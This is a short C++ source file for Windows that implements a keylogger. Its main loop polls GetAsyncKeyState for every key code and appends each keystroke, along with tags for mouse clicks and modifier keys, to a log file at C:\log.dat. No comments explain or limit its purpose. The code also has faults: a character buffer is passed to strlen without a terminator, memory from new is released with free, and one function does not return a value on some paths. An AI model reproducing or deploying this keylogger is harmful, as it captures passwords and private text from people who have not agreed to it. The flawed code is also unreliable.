#include <windows.h> 

bool KeyIsSpecial(int iGetKey);
void createFile();
void Save(char text[]);
void SaveKeyEdition(char key);

HANDLE hFile = NULL;

int main()
{
	char key;
	while (1)
	{
		Sleep(5);
		for (key = 8; key <= 222; key++)
		{
			if (GetAsyncKeyState(key) == -32767) {
				if (KeyIsSpecial(key) == false)
				{
					SaveKeyEdition(key);
				}
			}
		}
	}
	return 0;
}

bool KeyIsSpecial(int key) 
{
	switch (key)
	{
	case VK_LBUTTON:
		Save(" &LM ");
		Save("\n");
		break;
	case VK_RBUTTON:
		Save(" &RM ");
		break;
	case VK_RETURN:
		Save(" &Return ");
		Save("\n");
		break;
	case VK_ESCAPE:
		Save(" &Esc ");
		break;
	case VK_CONTROL:
		Save(" &Ctrl ");
		break;
	case VK_SHIFT:
		Save(" &Shift ");
		break;
	case VK_SPACE:
		Save(" ");
		break;
	case VK_BACK:
		Save(" &BackSpace ");
		break;
	case VK_TAB:
		Save(" &Tab ");
		Save("\n");
		break;
	case VK_MENU:
		Save(" &Alt ");
		break;
	default: return FALSE;
	}
}

void Save(char text[])
{
	DWORD ile;
	if (hFile == NULL)
		createFile();
	SetFilePointer(hFile,0,NULL,FILE_END);
	bool result = WriteFile(hFile, text, strlen(text), &ile, NULL);
}

void createFile()
{
	 hFile = CreateFile(
		TEXT("C:\\log.dat"),
		FILE_GENERIC_WRITE, 
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		CREATE_NEW,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	 if (hFile == INVALID_HANDLE_VALUE)
	 {
		 hFile = CreateFile(
			 TEXT("C:\\log.dat"),
			 FILE_GENERIC_WRITE,
			 FILE_SHARE_READ | FILE_SHARE_WRITE,
			 NULL,
			 OPEN_EXISTING,
			 FILE_ATTRIBUTE_NORMAL,
			 0
			 );
	 }
}

void SaveKeyEdition(char key)
{
	char* nowy = new char[sizeof(char)*2];
	*nowy = key;
	Save(nowy);
	free(nowy);
}